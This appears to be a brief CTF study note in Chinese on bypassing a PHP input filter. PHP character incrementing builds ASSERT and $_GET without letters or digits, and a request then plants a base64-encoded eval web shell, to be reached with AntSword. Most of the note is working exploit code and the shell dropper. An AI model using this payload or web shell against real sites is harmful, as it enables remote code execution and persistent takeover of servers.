tags:: CTF/PHP/WAF绕过

- # 思路
	- 利用php中char的自增特性进行无数字字母RCE
- # 构造字母A
	- 将一个数组转换成字符串`Array`，然后取第一个字符
	- ```python
	  [
	    "$_=[];",
	    '$_="$_";',
	    "$_=$_[$_==__];",
	  ]
	  ```
- # 利用字母A构造其他字母
	- 如果`$__`是字母A,那么利用自增`$__++`就可以得到字母B等
	- 这样只可以得到大写字母
- # payload构造
	- 构造出`ASSERT`以及`$_GET['_']`
		- ```python
		  def append_char(c):
		      return [
		          "$__=$_;", # A
		          *["$__++;" for _ in range(ord("A"), ord(c))],
		          "$___=$___.$__;"
		      ]
		  
		  cmd = [
		      "$_=[];",
		      '$_="$_";',
		      "$_=$_[$_==__];",
		      '$___="";',
		      *append_char("A"),
		      *append_char("S"),
		      *append_char("S"),
		      *append_char("E"),
		      *append_char("R"),
		      *append_char("T"),
		      "$____=$___;", # ASSERT
		      '$___="_";',
		      *append_char("G"),
		      *append_char("E"),
		      *append_char("T"),
		      "$_____=$___;", # _GET
		      "$______=${$_____}['_'];" # $_GET['_'];
		  ]
		  ```
	- 然后这么使用
		- ```python
		  r = base_get(url, params = {
		      "wllm": "CMD?><?=@$____($______)?>___>_<!!".replace("CMD", "".join(cmd)),
		      "_": "file_put_contents('test.php', base64_decode('PD9waHAKZXZhbCgkX1BPU1RbZGF0YV0pOwo/Pg=='));"
		  }, acceptable_code=[200, 500])
		  print(r.status_code)
		  print(r.text.rpartition("</code>")[2])
		  ```
	- 写马用蚁剑连上就行